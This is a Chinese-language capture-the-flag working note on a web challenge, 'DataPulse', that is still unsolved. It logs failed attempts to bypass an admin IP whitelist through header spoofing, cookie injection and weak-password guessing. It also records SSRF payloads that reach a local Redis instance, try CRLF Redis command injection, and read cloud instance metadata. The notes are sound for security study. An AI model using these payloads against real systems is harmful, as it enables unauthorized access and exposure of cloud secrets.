# WEB 1-4 DataPulse — 第二轮补充（仍未解出）

> 接 `WEB3-DataPulse.md`。本文件只记录第二轮新增的验证，避免覆盖并行会话的笔记。

## 新增测试（全部失败）

### admin 白名单：所有 IP 头都无效

对 `/api/v1/admin/` 逐一测试，全部 403 `Your IP is not in the admin whitelist`：

```
X-Forwarded-For / X-Real-IP / Forwarded / X-Client-IP / CF-Connecting-IP
True-Client-IP / X-Originating-IP / X-Remote-IP / X-Remote-Addr / Client-IP
X-Forwarded-Host / X-Host / Host
值尝试：127.0.0.1 / 10.0.0.1 / 172.17.0.1 / ::1 / 192.168.1.1
```

- 注册/登录时带同样的头，再访问 admin：仍 403（会话不记录 IP）
- Cookie 注入 `role=platform_admin`、`ip=127.0.0.1`、`whitelist=1`：仍 403
- Host 头伪造 `admin.internal` / `internal` / `admin.datapulse.local` 等：仍 403
- `?debug=1`、`?internal=1`、`?whitelist=1`、`?ip=127.0.0.1`、`?role=platform_admin`：仍 403
- `/api/v1/./admin/`、`/api/v1/admin/..;/`：403 / 404
- HEAD / OPTIONS / PUT：403
- 路径枚举：只有 `/api/v1/admin/` 存在（其余全部 404）
- 任务子路由：`/tasks/<id>` 只有详情，`result/logs/output/download` 全部 404
- `/tasks/list/?all=1&user=platform_admin`：没有 IDOR

### 账号层面

- `admin`、`platform_admin` 已存在（注册返回 409）
- `Admin`、`ADMIN`、`platform_adminX`、`platform_admin.` 可注册，但 role 恒为 `analyst`
- `platform_admin ` / ` platform_admin` 被判重复（注册前会 strip 空白）
- `platform_admin` 弱口令尝试 18 个全部 401
- 用户名超长报 “Username must be 3-32 characters”，无截断

### SSRF 能力边界

| URL | 结果 |
|---|---|
| `http://127.0.0.2:8000/` | 200（绕过校验） |
| `http://localhost.localdomain:8000/` | 200（解析到 127.0.0.1） |
| `http://localhost.localdomain:6379/` | Redis 可达（Remote end closed） |
| `http://localhost.localdomain:6379/x%0d%0aDEBUG%20SLEEP%2015%0d%0a` | 无延迟差 → urllib 不解码 %0d%0a，**无法注入 Redis 命令** |
| `http://[::1]:8000/` | Cannot assign requested address（未监听 IPv6） |
| `http://172.31.73.63:32210/` | 200（走外部映射回到自己） |
| `http://172.31.73.63:8000/` | Connection refused（应用只监听回环） |
| `http://169.254.0.23/latest/meta-data/` | **200，腾讯云元数据可读** |
| `http://169.254.0.23/latest/meta-data/local-ipv4` | `172.31.73.63` |
| `http://169.254.0.23/latest/meta-data/hostname` | `VM-73-63-centos` |
| `http://169.254.0.23/latest/user-data` | 腾讯云 cloud-init 脚本（无 flag） |
| `http://169.254.0.23/latest/meta-data/cam/security-credentials/` | 404（无 CAM 角色） |
| `file://`（含 `FILE://`/`File://`/`file:/`） | 400 Invalid webhook URL |
| 302 → `file://` / `gopher://` | urllib 拒绝重定向 |
| 302 → `ftp://` | 允许，但本机无 FTP |

### 其它

- Flask debug 关闭（畸形 JSON 触发 500 但无 traceback）
- 任务类型只有 csv_analysis / statistics / aggregation，`data` 字段只按 CSV/数字/JSON 解析，无文件读取
- Docker 主机名（web/app/redis…）不解析；172.17/172.18/10.0.x:8000 全部 refused
- 平台 TCP 代理把外部请求的源 IP 固定为代理地址，admin 白名单既非 127.0.0.1、也非 VM 内网 IP

## 结论

admin 的 IP 白名单是**固定 IP**，在仅 HTTP 的 SSRF 下无法命中；Redis 可达但 urllib 不做 CRLF 解码，无法写 session/白名单。

可能的突破方向（留给后续）：

1. 找到能**控制 webhook 请求体/头**的参数（当前 `headers`/`method` 字段被忽略）；
2. 找到从 Redis 读数据的路径（例如 app 的缓存调试端点）；
3. 若允许 gopher 或 CRLF，写 session 伪造 platform_admin，并改白名单键。
